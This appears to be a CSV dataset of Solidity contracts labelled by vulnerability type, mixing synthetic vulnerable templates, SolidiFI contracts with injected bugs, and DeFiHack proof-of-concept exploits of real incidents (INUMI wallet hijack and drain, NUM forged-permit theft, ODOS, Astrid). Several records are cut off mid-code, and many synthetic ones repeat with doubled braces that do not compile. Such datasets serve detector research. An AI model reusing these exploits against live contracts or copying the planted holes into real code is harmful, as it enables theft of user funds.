source,filename,label,label_id,code
defihack,ODOS_exp.sol,other,13,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import ""forge-std/Test.sol"";
import ""./../interface.sol"";

// @KeyInfo - Total Lost : ~50k
// Attacker : https://basescan.org/address/0x4015d786e33c1842c3e4d27792098e4a3612fc0e
// Attack Contract : https://basescan.org/address/0x22a7da241a39f189a8aec269a6f11a238b6086fc
// Vulnerable Contract : https://basescan.org/address/0xb6333e994fd02a9255e794c177efbdeb1fe779c7
// Attack Tx : https://basescan.org/tx/0xd10faa5b33ddb501b1dc6430896c966048271f2510ff9ed681dd6d510c5df9f6

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xb6333e994fd02a9255e794c177efbdeb1fe779c7#code

// @Analysis
// Post-mortem : 
// Twitter Guy : https://x.com/Phalcon_xyz/status/1882630151583981787
// Hacking God : 

interface OdosLimitOrderRouter {
    function isValidSigImpl(
        address _signer,
        bytes32 _hash,
        bytes calldata _signature,
        bool allowSideEffects
    ) external returns (bool);
}

contract ContractTest is Test {
    OdosLimitOrderRouter odosLimitOrderRouterInstance =
        OdosLimitOrderRouter(0xB6333E994Fd02a9255E794C177EfBDEB1FE779C7);
    IUSDC USDCInstance = IUSDC(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    bytes32 ERC6492_DETECTION_SUFFIX = bytes32(hex""6492649264926492649264926492649264926492649264926492649264926492"");

    function setUp() public {
        vm.createSelectFork(""base"", 25431001 - 1);

        vm.label(address(odosLimitOrderRouterInstance), ""OdosLimitOrderRouter"");
        vm.label(address(USDCInstance), ""USDC"");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            ""[Start] Attacker USDC balance before exploit"",
            USDCInstance.balanceOf(address(this)),
            6
        );

        uint256 victimUSDCBalance = USDCInstance.balanceOf(address(odosLimitOrderRouterInstance));

        bytes memory customCalldata = abi.encodeCall(IUSDC.transfer, (address(this), victimUSDCBalance));
        bytes memory signature = abi.encodePacked(
            abi.en"
synthetic,synthetic_front_running_mev_215.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_215_6766"
synthetic,synthetic_access_control_198.sol,access_control,3,"pragma solidity ^0.8.0;
contract AccessControlVuln {
    address public owner;
    constructor() { owner = msg.sender; }
    function changeOwner(address _new) public {  // missing onlyOwner modifier
        owner = _new;
    }
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
// variant_198_2642"
synthetic,synthetic_reentrancy_27.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_27_1293"
synthetic,synthetic_timestamp_dependence_231.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_231_3983"
synthetic,synthetic_access_control_492.sol,access_control,3,"pragma solidity ^0.8.0;
contract AccessControlVuln {
    address public owner;
    constructor() { owner = msg.sender; }
    function changeOwner(address _new) public {  // missing onlyOwner modifier
        owner = _new;
    }
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
// variant_492_3795"
synthetic,synthetic_reentrancy_26.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_26_4122"
synthetic,synthetic_flash_loan_single_block_537.sol,flash_loan_single_block,11,"pragma solidity ^0.8.0;
interface IERC20 {{ function transfer(address to, uint amount) external returns (bool); }}
interface IPool {{ function borrow(uint amount) external; function repay(uint amount) external; }}
contract SingleBlockFlashAttack {{
    IPool pool;
    IERC20 token;
    constructor(address _pool, address _token) {{ pool = IPool(_pool); token = IERC20(_token); }}
    function execute(uint amount) external {{
        pool.borrow(amount);           // borrow in same block
        // exploit logic
        pool.repay(amount);            // repay in same block
    }}
}}
// variant_537_8504"
synthetic,synthetic_proxy_storage_collision_470.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_470_4515"
synthetic,synthetic_proxy_storage_collision_270.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_270_9452"
solidifi,buggy_44.sol,unchecked_call,6,"/**
 *Submitted for verification at Etherscan.io on 2019-09-24
*/

pragma solidity ^0.5.0;


contract EventMetadata {

  bool public payedOut_unchk33 = false;

function withdrawLeftOver_unchk33() public {
        require(payedOut_unchk33);
        msg.sender.send(address(this).balance);
    }
  event MetadataSet(bytes metadata);

    // state functions

    function _setMetadata(bytes memory metadata) internal {
        emit MetadataSet(metadata);
    }
function withdrawBal_unchk17 () public{
	uint64 Balances_unchk17 = 0;
	msg.sender.send(Balances_unchk17);}
}



contract Operated {

  function unhandledsend_unchk2(address payable callee) public {
    callee.send(5 ether);
  }
  address private _operator;
  function bug_unchk43() public{
address payable addr_unchk43;
if (!addr_unchk43.send (10 ether) || 1==1)
	{revert();}
}
  bool private _status;

  function bug_unchk27(address payable addr) public
      {addr.send (42 ether); }
  event OperatorUpdated(address operator, bool status);

    // state functions

    function _setOperator(address operator) internal {
        require(_operator != operator, ""cannot set same operator"");
        _operator = operator;
        emit OperatorUpdated(operator, hasActiveOperator());
    }
function callnotchecked_unchk37(address payable callee) public {
    callee.call.value(1 ether);
  }

    function _transferOperator(address operator) internal {
        // transferring operator-ship implies there was an operator set before this
        require(_operator != address(0), ""operator not set"");
        _setOperator(operator);
    }
function bug_unchk3(address payable addr) public
      {addr.send (42 ether); }

    function _renounceOperator() internal {
        require(hasActiveOperator(), ""only when operator active"");
        _operator = address(0);
        _status = false;
        emit OperatorUpdated(address(0), false);
    }
bool public payedOut_unchk9 = false;

function withdrawLeftOver_unchk9() public {
        require(payedOut_unchk9);
        msg.sender.send(address(this)"
defihack,INUMI_exp.sol,other,13,"pragma solidity ^0.8.10;

import ""forge-std/Test.sol"";
import ""../interface.sol"";

// @KeyInfo - Total Lost : 11,000 USD
// Attacker : https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd
// Attack Contract : https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd
// Vulnerable Contract : https://etherscan.io/address/0xdb27d4ff4be1cd04c34a7cb6f47402c37cb73459
// Attack Tx : https://etherscan.io/tx/0xbeef352f716973043236f73dd5104b9d905fd04b7fc58d9958ac5462e7e3dbc1

// @Info
// Vulnerable Contract Code : N/A

// @Analysis

// Post-mortem : https://x.com/TenArmorAlert/status/1834504921561100606
// Twitter Guy : https://x.com/TenArmorAlert/status/1834504921561100606
// Hacking God : N/A

address constant addr1 = 0xdb27D4ff4bE1cd04C34A7cB6f47402c37Cb73459;
address constant attacker = 0xd215FFaf0F85fB6f93F11E49Bd6175ad58af0Dfd;
address constant addr2 = 0xd129D8C12f0e7aA51157D9e6cc3F7Ece2dc84ecD;

interface ITarget {
    function setMarketingWallet(address walletAddress) external;
    function rescueEth() external;
}

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork(""mainnet"", 20729548);
        deal(attacker, 1.07297e-13 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint(""before attack: balance of attacker"", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(address(attC), 5.000000000000028 ether);
        attC.attack{value: 1.07297e-13 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint(""after attack: balance of attacker"", address(attacker).balance, 18);
    }
}

// 0xd129D8C12f0e7aA51157D9e6cc3F7Ece2dc84ecD
contract AttackerC {
    function attack() public payable {
        ITarget(addr1).setMarketingWallet(address(this));
        ITarget(addr1).rescueEth();
        (bool s, ) = attacker.call{value: address(this).balance}("""");
    }
  
    fallback() external payable {}

    receive() external payable {}
}"
synthetic,synthetic_reentrancy_191.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_191_8091"
synthetic,synthetic_flash_loan_single_block_305.sol,flash_loan_single_block,11,"pragma solidity ^0.8.0;
interface IERC20 {{ function transfer(address to, uint amount) external returns (bool); }}
interface IPool {{ function borrow(uint amount) external; function repay(uint amount) external; }}
contract SingleBlockFlashAttack {{
    IPool pool;
    IERC20 token;
    constructor(address _pool, address _token) {{ pool = IPool(_pool); token = IERC20(_token); }}
    function execute(uint amount) external {{
        pool.borrow(amount);           // borrow in same block
        // exploit logic
        pool.repay(amount);            // repay in same block
    }}
}}
// variant_305_2644"
synthetic,synthetic_reentrancy_535.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_535_8557"
synthetic,synthetic_dos_gas_287.sol,dos_gas,5,"pragma solidity ^0.8.0;
contract DoSGasVuln {
    address[] public investors;
    mapping(address => uint) public balances;
    function invest() external payable { investors.push(msg.sender); balances[msg.sender] += msg.value; }
    function refundAll() external {
        for (uint i = 0; i < investors.length; i++) {
            address investor = investors[i];
            payable(investor).transfer(balances[investor]);
        }
    }
}
// variant_287_7476"
synthetic,synthetic_flash_loan_oracle_473.sol,flash_loan_oracle,10,"pragma solidity ^0.8.0;
interface IFlashLoan {{ function flashLoan(uint amount) external; }}
interface IOracle {{ function getPrice() external view returns (uint); }}
contract FlashLoanOracleAttack {{
    IFlashLoan lender;
    IOracle oracle;
    constructor(address _l, address _o) {{ lender = IFlashLoan(_l); oracle = IOracle(_o); }}
    function attack(uint amount) external {{
        lender.flashLoan(amount);
        // Manipulate oracle price here
        uint price = oracle.getPrice();
    }}
    receive() external payable {{}}
}}
// variant_473_2988"
synthetic,synthetic_reentrancy_434.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_434_1404"
synthetic,synthetic_reentrancy_84.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_84_1152"
synthetic,synthetic_flash_loan_single_block_216.sol,flash_loan_single_block,11,"pragma solidity ^0.8.0;
interface IERC20 {{ function transfer(address to, uint amount) external returns (bool); }}
interface IPool {{ function borrow(uint amount) external; function repay(uint amount) external; }}
contract SingleBlockFlashAttack {{
    IPool pool;
    IERC20 token;
    constructor(address _pool, address _token) {{ pool = IPool(_pool); token = IERC20(_token); }}
    function execute(uint amount) external {{
        pool.borrow(amount);           // borrow in same block
        // exploit logic
        pool.repay(amount);            // repay in same block
    }}
}}
// variant_216_8451"
defihack,Astrid_exp.sol,other,13,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import ""forge-std/Test.sol"";
import ""./../interface.sol"";

// @KeyInfo - Total Lost : ~228591 USD$
// Attacker : https://etherscan.io/address/0x792ec27874e1f614e757a1ae49d00ef5b2c73959
// Attack Contract : https://etherscan.io/address/0xb2e855411f67378c08f47401eacff37461e16188
// Vulnerable Contract : https://etherscan.io/address/0xbAa87546cF87b5De1b0b52353A86792D40b8BA70
// Attack Tx : https://etherscan.io/tx/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1718454835966775325
contract MyERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 18;
    address public stakedTokenAddr;
    uint256 public scaledBalanceToBal;

    constructor(address _stakedTokenAddress, uint256 bal) public {
        stakedTokenAddr = _stakedTokenAddress;
        scaledBalanceToBal = bal;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(
        uint256 amount
    ) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(address sender, uint256 amount) external {
        balanceOf[sender] -= amount;
        totalSupply -= "
synthetic,synthetic_flash_loan_single_block_151.sol,flash_loan_single_block,11,"pragma solidity ^0.8.0;
interface IERC20 {{ function transfer(address to, uint amount) external returns (bool); }}
interface IPool {{ function borrow(uint amount) external; function repay(uint amount) external; }}
contract SingleBlockFlashAttack {{
    IPool pool;
    IERC20 token;
    constructor(address _pool, address _token) {{ pool = IPool(_pool); token = IERC20(_token); }}
    function execute(uint amount) external {{
        pool.borrow(amount);           // borrow in same block
        // exploit logic
        pool.repay(amount);            // repay in same block
    }}
}}
// variant_151_5771"
synthetic,synthetic_timestamp_dependence_232.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_232_6213"
synthetic,synthetic_proxy_storage_collision_339.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_339_4068"
synthetic,synthetic_reentrancy_378.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_378_1665"
synthetic,synthetic_timestamp_dependence_581.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_581_9199"
synthetic,synthetic_front_running_mev_227.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_227_7116"
synthetic,synthetic_misnamed_constructor_40.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_40_8378"
synthetic,synthetic_reentrancy_489.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_489_9238"
synthetic,synthetic_timestamp_dependence_386.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_386_7358"
solidifi,buggy_2.sol,other,13,"/**
 * Source Code first verified at https://etherscan.io on Tuesday, May 7, 2019
 (UTC) */

pragma solidity >=0.4.21 <0.6.0;

contract CareerOnToken {
  bool not_called_re_ent27 = true;
function bug_re_ent27() public{
        require(not_called_re_ent27);
        if( ! (msg.sender.send(1 ether) ) ){
            revert();
        }
        not_called_re_ent27 = false;
    }
  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  mapping(address => uint) balances_re_ent31;
function withdrawFunds_re_ent31 (uint256 _weiToWithdraw) public {
        require(balances_re_ent31[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(msg.sender.send(_weiToWithdraw));  //bug
        balances_re_ent31[msg.sender] -= _weiToWithdraw;
    }
  event Approval(address indexed a_owner, address indexed _spender, uint256 _value);
  bool not_called_re_ent13 = true;
function bug_re_ent13() public{
        require(not_called_re_ent13);
        bool success=msg.sender.call.value(1 ether)("""");
        if( ! success ){
            revert();
        }
        not_called_re_ent13 = false;
    }
  event OwnerChang(address indexed _old,address indexed _new,uint256 _coin_change);
    
  mapping(address => uint) redeemableEther_re_ent25;
function claimReward_re_ent25() public {        
        // ensure there is a reward to give
        require(redeemableEther_re_ent25[msg.sender] > 0);
        uint transferValue_re_ent25 = redeemableEther_re_ent25[msg.sender];
        msg.sender.transfer(transferValue_re_ent25);   //bug
        redeemableEther_re_ent25[msg.sender] = 0;
    }
  uint256 public totalSupply;  
  mapping(address => uint) userBalance_re_ent19;
function withdrawBalance_re_ent19() public{
        // send userBalance[msg.sender] ethers to msg.sender
        // if mgs.sender is a contract, it will call its fallback function
        if( ! (msg.sender.send(userBalance_re_ent19[msg.sender]) ) ){
            revert();
        }
        userBalance_re_ent19[msg.sender] = 0;
    }
  string publi"
synthetic,synthetic_timestamp_dependence_235.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_235_9129"
synthetic,synthetic_proxy_storage_collision_561.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_561_5012"
synthetic,synthetic_flash_loan_single_block_374.sol,flash_loan_single_block,11,"pragma solidity ^0.8.0;
interface IERC20 {{ function transfer(address to, uint amount) external returns (bool); }}
interface IPool {{ function borrow(uint amount) external; function repay(uint amount) external; }}
contract SingleBlockFlashAttack {{
    IPool pool;
    IERC20 token;
    constructor(address _pool, address _token) {{ pool = IPool(_pool); token = IERC20(_token); }}
    function execute(uint amount) external {{
        pool.borrow(amount);           // borrow in same block
        // exploit logic
        pool.repay(amount);            // repay in same block
    }}
}}
// variant_374_8484"
synthetic,synthetic_proxy_storage_collision_187.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_187_7697"
synthetic,synthetic_flash_loan_oracle_583.sol,flash_loan_oracle,10,"pragma solidity ^0.8.0;
interface IFlashLoan {{ function flashLoan(uint amount) external; }}
interface IOracle {{ function getPrice() external view returns (uint); }}
contract FlashLoanOracleAttack {{
    IFlashLoan lender;
    IOracle oracle;
    constructor(address _l, address _o) {{ lender = IFlashLoan(_l); oracle = IOracle(_o); }}
    function attack(uint amount) external {{
        lender.flashLoan(amount);
        // Manipulate oracle price here
        uint price = oracle.getPrice();
    }}
    receive() external payable {{}}
}}
// variant_583_8619"
synthetic,synthetic_front_running_mev_250.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_250_3236"
synthetic,synthetic_misnamed_constructor_373.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_373_4836"
synthetic,synthetic_access_control_470.sol,access_control,3,"pragma solidity ^0.8.0;
contract AccessControlVuln {
    address public owner;
    constructor() { owner = msg.sender; }
    function changeOwner(address _new) public {  // missing onlyOwner modifier
        owner = _new;
    }
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
// variant_470_2565"
defihack,NUM_exp.sol,other,13,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import ""forge-std/Test.sol"";
import ""./../interface.sol"";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1595346020237352960
// @TX
// https://etherscan.io/tx/0x8a8145ab28b5d2a2e61d74c02c12350731f479b3175893de2014124f998bff32

interface MultichainRouter {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
}

contract ContractTest is Test {
    IERC20 NUM = IERC20(0x3496B523e5C00a4b4150D6721320CdDb234c3079);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    MultichainRouter multichainRouter = MultichainRouter(0x765277EebeCA2e31912C9946eAe1021199B39C61);
    Uni_Router_V3 Router = Uni_Router_V3(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    address victimAddress = 0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c;
    uint256 NUMBalance;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork(""mainnet"", 16_029_969);
    }

    function testExploit() external {
        NUMBalance = NUM.balanceOf(victimAddress);
        uint8 v = 0;
        bytes32 r = 0x3078000000000000000000000000000000000000000000000000000000000000;
        bytes32 s = 0x3078000000000000000000000000000000000000000000000000000000000000;
        multichainRouter.anySwapOutUnderlyingWithPermit(
            victimAddress, address(this), address(this), NUMBalance, block.timestamp + 60, v, r, s, 12
        );
        NUM.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        NUM.transfer(address(Router), NUM.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(NUM);
        path[1] = address(USDC);
 "
